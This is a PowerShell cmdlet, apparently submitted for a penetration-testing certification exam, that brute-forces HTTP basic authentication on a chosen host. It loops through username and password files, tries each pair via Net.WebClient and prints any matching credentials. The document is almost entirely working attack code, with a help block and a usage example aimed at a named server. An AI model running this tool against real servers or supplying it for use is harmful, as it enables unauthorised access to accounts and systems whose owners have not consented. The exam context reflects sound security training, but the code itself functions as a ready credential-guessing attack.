## Powershell For Penetration Testers Exam Task 1 - Brute Force Basic Authentication Cmdlet
function BruteForce-Basic-Auth
{

<#

.SYNOPSIS
PowerShell cmdlet for brute forcing web server basic authentication.

.DESCRIPTION
This powershell script try to authenticate to a web server with a list of username and password given as parameters.

.PARAMETER Host
Specifies the hostname or IP address to connect to.

.PARAMETER Port
Specifies the port of the basic authentication server. Default is 80.

.PARAMETER UsernameList
Specifies a list of usernames to use for the brute force.

.PARAMETER PasswordList
Specifies a list of passwords to use for the brute force.

.PARAMETER StopOnSuccess
Use this switch to stop the brute force attack on the first success.

.PARAMETER Delay
Specifies the seconds of delay between brute-force attempts, defaults is 0.

.EXAMPLE
PS > . .\BruteForce-Basic-Auth.ps1
PS > BruteForce-Basic-Auth -Host www.basicauthserver.com -Users users.txt -Passwords passwords.txt -StopOnSuccess -Delay 3

.LINK
http://labofapenetrationtester.blogspot.com/
https://github.com/samratashok/nishang/blob/master/Scan/Invoke-BruteForce.ps1

.NOTES
This script has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam
http://www.securitytube-training.com/online-courses/powershell-for-pentesters/
Student ID: PSP-3190

This script has been inspired by https://github.com/samratashok/nishang/blob/master/Scan/Invoke-BruteForce.ps1
#>


[CmdletBinding()] Param(
        [Parameter(Mandatory = $true, Position = 0, ValueFromPipeline=$true)]
        [Alias("IP","IPAddress","Url","Domain")]
        [String]
        $Hostname, 

        [Parameter(Position = 1, Mandatory = $true)]
        [Alias('Users')]
        [String]
        $UsernameList,

        [Parameter(Position = 2, Mandatory = $true)]
        [Alias('Passwords')]
        [String]
        $PasswordList,
                     
        [Parameter(Position = 3, Mandatory = $false)]
        [UInt32]
        $Port = 80,

        [Parameter(Position = 4, Mandatory = $false)]
        [Switch]
        $StopOnSuccess,

        [Parameter(Position = 5, Mandatory = $false)]
        [UInt32]
        $Delay = 0
)

    
  $target = $Hostname + ':' + $Port
  $found = $false
  $Usernames = Get-Content $UsernameList
  $Passwords = Get-Content $PasswordList
  
  Write-Verbose "Brute-forcing basic authentication: $target"

  :USERloop foreach ($Username in $Usernames)
  {
    foreach ($Password in $Passwords)
    {

      $WebClient = New-Object Net.WebClient
      $SecurePassword = ConvertTo-SecureString -AsPlainText -String $Password -Force
      $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $Username, $SecurePassword
      $WebClient.Credentials = $Credential
      Try
      {
      
        Write-Verbose "Checking $Username : $Password"
        $message
        $content = $webClient.DownloadString($target)
        $success = $true
        $found = $true
        if ($success -eq $true)
        {
          # Credential found
          Write-Output "Match found! $Username : $Password"
          if ($StopOnSuccess)
          {
            break USERloop
          }
        }
      }
      Catch
      {
        $success = $false
        Write-verbose 'Password does not match'
      }
      if ($Delay -gt 0){
        Write-Verbose "Sleeping $delay seconds"
        Start-Sleep -Seconds $delay
      }
    }
  }
  if ($found -eq  $false){
    Write-Output "No password found, try harder!"
  }
}

